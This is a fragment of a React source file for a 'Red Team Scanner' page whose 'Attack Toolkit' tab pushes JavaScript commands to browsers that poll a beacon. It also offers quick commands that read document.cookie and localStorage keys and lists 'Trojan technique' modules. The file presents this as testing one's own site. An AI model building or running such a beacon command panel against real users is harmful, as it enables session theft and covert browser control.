              className="w-full bg-black/60 border border-primary/15 text-green-400/70 text-[10px] font-mono px-2 py-2 rounded-sm focus:outline-none focus:border-primary/25 resize-none"
              placeholder="document.title" />
            <Button onClick={() => cmdMut.mutate()} disabled={!cmdCode.trim() || cmdMut.isPending}
              className="w-full h-8 text-xs rounded-sm bg-purple-500/10 border border-purple-500/30 text-purple-400/70 hover:bg-purple-500/20">
              {cmdMut.isPending ? <Loader2 className="w-3 h-3 animate-spin mr-1.5" /> : <Send className="w-3 h-3 mr-1.5" />}
              Push Command
            </Button>
            {cmdMut.isSuccess && <div className="text-[9px] text-[#00ff88]/50">Command queued — will execute on next beacon poll</div>}

            {/* Quick commands */}
            <div className="text-[8px] text-primary/20 mt-1">Quick:</div>
            <div className="flex flex-wrap gap-1">
              {[
                ["document.title", "Get title"],
                ["Object.keys(localStorage)", "LS keys"],
                ["document.cookie", "Cookies"],
                ["location.href", "Current URL"],
                ["navigator.userAgent", "User-Agent"],
              ].map(([code, label]) => (
                <button key={label} onClick={() => setCmdCode(code)}
                  className="text-[8px] px-1.5 py-0.5 border border-primary/10 text-primary/25 hover:text-primary/50 rounded-sm">
                  {label}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Technique reference */}
        <div className="border border-primary/10 rounded-sm p-3">
          <div className="text-[9px] font-bold uppercase tracking-widest text-primary/25 mb-2">Twizted v1.0 Sources</div>
          <div className="space-y-1">
            {TOOLKIT_MODULES.map(m => (
              <div key={m.id} className="flex items-center gap-2 text-[9px]">
                <span className="font-mono w-3 h-3 shrink-0" style={{ color: m.color }}>{m.icon}</span>
                <span className="font-mono shrink-0" style={{ color: m.color }}>{m.bas}</span>
                <span className="text-primary/25 truncate">{m.label}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Main Page ────────────────────────────────────────────────────────────────

export default function RedTeamScan() {
  const [tab, setTab] = useState<"scanner" | "toolkit">("scanner");

  return (
    <div className="min-h-screen bg-black text-primary p-4 md:p-6 max-w-6xl mx-auto">
      {/* Header */}
      <div className="mb-5">
        <div className="flex items-center gap-3 mb-1">
          <Target className="w-5 h-5 text-red-400" />
          <h1 className="text-lg font-bold tracking-tight">Red Team Scanner</h1>
          <span className="text-[9px] border border-red-500/20 text-red-400/40 px-1.5 py-0.5 rounded uppercase tracking-widest">Twizted v1.0</span>
        </div>
        <p className="text-[10px] text-primary/30 max-w-2xl">
          Two modes: <span className="text-primary/50">Scanner</span> checks your site's defenses against 8 attack classes.
          <span className="text-primary/50"> Attack Toolkit</span> deploys the actual Trojan techniques from each .bas source file so you can physically test your system's response.
        </p>
      </div>

      {/* Tab switcher */}
      <div className="flex gap-0 mb-5 border border-primary/10 rounded-sm overflow-hidden w-fit">
        {([["scanner", "Scanner", <Search className="w-3 h-3" />], ["toolkit", "Attack Toolkit", <Bug className="w-3 h-3" />]] as const).map(([id, label, icon]) => (
          <button key={id} onClick={() => setTab(id)}
            className={`flex items-center gap-1.5 px-4 py-2 text-[11px] font-semibold transition-all ${tab === id ? "bg-red-500/15 text-red-400" : "text-primary/30 hover:text-primary/50 hover:bg-white/[0.02]"}`}>
            {icon}{label}
          </button>
        ))}
      </div>

      {tab === "scanner" ? <ScannerTab /> : <AttackToolkitTab />}
    </div>
  );
}
